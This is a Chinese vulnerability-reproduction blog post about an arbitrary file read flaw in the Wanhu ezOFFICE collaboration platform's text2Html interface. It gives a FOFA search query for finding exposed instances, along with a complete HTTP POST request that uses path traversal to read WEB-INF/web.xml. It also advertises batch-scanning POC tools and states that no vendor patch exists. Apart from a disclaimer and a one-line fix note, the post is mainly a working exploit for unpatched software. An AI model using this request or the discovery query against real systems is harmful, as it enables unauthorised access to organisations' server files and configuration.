#  万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-25 13:53  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 万户协同办公平台ezoffice简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
万户ezOFFICE集团版协同平台以工作流程、知识管理、沟通交流和辅助办公四大核心应用  
## 2.漏洞描述  
  
万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
万户ezOFFICE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aoeb6HEJFrqN8wo8iaM5avPDzrFKSldAM2bHo9ZPAQhMrBJo0tep1mzlxnPicXSRexfHDZIsriaTjaA/640?wx_fmt=jpeg&from=appmsg "null")  
  
万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="万户网络-ezOFFICE"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/defaultroot/convertFile/text2Html.controller  
  
漏洞数据包：  
```
POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aoeb6HEJFrqN8wo8iaM5avPwkdymqeX1p4tHhsulibLQ4IHThczQbdkp7qrTKfNjxQOFQNNrUF52Fg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aoeb6HEJFrqN8wo8iaM5avPPicUNRibuTSiboo584VaO2LyRRdW7ugVw13h6pjHvKJDL1z45HTK8jzaQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aoeb6HEJFrqN8wo8iaM5avPiaZZm392wCBbmGQCxyeEajJWu6Kt2SWu2lXAZae3vH7gOsyb76rmicYg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aoeb6HEJFrqN8wo8iaM5avP5qiaeHic2GlXf6GoFdT1MShh5cCPheEG4yZZqYjgAAOSxB6JWJeKErJA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aoeb6HEJFrqN8wo8iaM5avPDtr2f3TJElLCvia9Zx1Mxic6wFAdCuTVAwgne831jkbjyTZ4o7xoYBmA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aoeb6HEJFrqN8wo8iaM5avP0KpHu0vzyvAOuR9jZB4t0TMV1Zaz8ibNdhXyv8gK5ibvtR6B3fdEr1WQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修补方案，请关注厂商主页及时更新： http://www.whir.net  
## 8.往期回顾  
  
[Edusoho网络课堂cms存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485379&idx=1&sn=cad3f569bd587a121cc02e29c1307a9e&chksm=974b8ac4a03c03d22e87ff77fe6efdd4d92264c555627fec752cde1c8ea4cc46f2b255088ec0&scene=21#wechat_redirect)  
  
  
[WordPress的Bricks主题存在远程命令执行漏洞CVE-2024-25600 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485348&idx=1&sn=f8fa0576b9bb01bd97a1b95ad844e70d&chksm=974b8aa3a03c03b5ed99651d783895f6110a653c7af1181b6e18dea8da26327281fe1d7fd17e&scene=21#wechat_redirect)  
  
  
  
  
